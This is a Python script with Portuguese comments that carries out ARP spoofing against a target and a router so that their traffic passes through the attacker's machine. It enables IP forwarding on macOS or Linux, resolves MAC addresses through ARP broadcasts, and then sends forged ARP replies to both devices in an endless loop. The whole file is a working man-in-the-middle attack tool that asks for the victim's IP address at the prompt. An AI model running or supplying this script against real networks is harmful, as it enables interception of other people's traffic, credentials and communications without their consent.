# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# =                          -                                   -=
# =    ATIVA REDIRECIONAMENTO DE PACOTES                        -=
# =                          -                                   -=
# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
def enable_ip_forwarding():
    """
    Ativa o redirecionamento de pacotes.
    Compatível com macOS e Linux.
    """
    # Identifica o sistema operacional
    system = platform.system()
    if system == "Darwin":  # macOS
        # Ativa IP forwarding no macOS
        os.system("sysctl -w net.inet.ip.forwarding=1")
        print("[INFO] IP Forwarding ativado no macOS.")
    elif system == "Linux":
        # Ativa IP forwarding no Linux
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[INFO] IP Forwarding ativado no Linux.")
    else:
        # Sistema operacional não suportado
        print("[ERRO] Sistema não suportado para ativar IP Forwarding.")


# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# =                          -                                   -=
# =    OBTÉM ENDEREÇO MAC                                        -=
# =                          -                                   -=
# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
def get_mac(ip):
    """
    Obtém o endereço MAC de um IP usando solicitações ARP.
    """
    print(f"[INFO] Tentando obter o MAC para {ip}...")

    # Envia pacote ARP para todos os dispositivos da rede
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    response, _ = srp(packet, timeout=3, verbose=False)

    if response:
        # Retorna o endereço MAC do primeiro dispositivo respondente
        mac = response[0][1].hwsrc
        print(f"[INFO] MAC encontrado para {ip}: {mac}")
        return mac
    else:
        # Consulta a tabela ARP do sistema como fallback
        result = os.popen(f"arp -n {ip}").read()
        if ip in result:
            mac = result.split()[3]
            if mac != "(incomplete)":
                print(f"[INFO] MAC encontrado na tabela ARP para {ip}: {mac}")
                return mac

        # Erro ao encontrar o endereço MAC
        print(f"[ERRO] Não foi possível encontrar o MAC para {ip}.")
        return None


# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# =                          -                                   -=
# =    REALIZA ARP SPOOFING                                      -=
# =                          -                                   -=
# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
def arp_spoof(target_ip, spoof_ip):
    """
    Realiza ARP Spoofing entre o alvo e o roteador.
    """
    # Valida os IPs fornecidos
    if not target_ip or not spoof_ip:
        print("[ERRO] Os IPs do alvo e do roteador devem ser fornecidos.")
        return

    # Obtém os endereços MAC dos dispositivos
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)

    # Verifica se os MACs foram obtidos com sucesso
    if not target_mac or not spoof_mac:
        print("[ERRO] Não foi possível obter todos os MACs necessários.")
        return

    # Cria os pacotes ARP Spoofing
    target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    router_packet = ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)

    print(f"[INFO] Iniciando ARP spoofing: {target_ip} -> {spoof_ip}")
    try:
        # Envia os pacotes continuamente para realizar o ataque
        while True:
            send(target_packet, verbose=False)
            send(router_packet, verbose=False)
    except KeyboardInterrupt:
        # Interrompe o ataque ao pressionar Ctrl+C
        print("\n[INFO] ARP spoofing interrompido.")


# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# =                          -                                   -=
# =    EXECUÇÃO PRINCIPAL                                        -=
# =                          -                                   -=
# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
if __name__ == "__main__":
    # Ativa o redirecionamento de pacotes no sistema
    enable_ip_forwarding()

    # Solicita ao usuário os IPs do alvo e do roteador
    target_ip = input("Digite o IP do alvo: ").strip()
    spoof_ip = input("Digite o IP do roteador: ").strip()

    # Executa o ARP Spoofing com os IPs fornecidos
    arp_spoof(target_ip, spoof_ip)
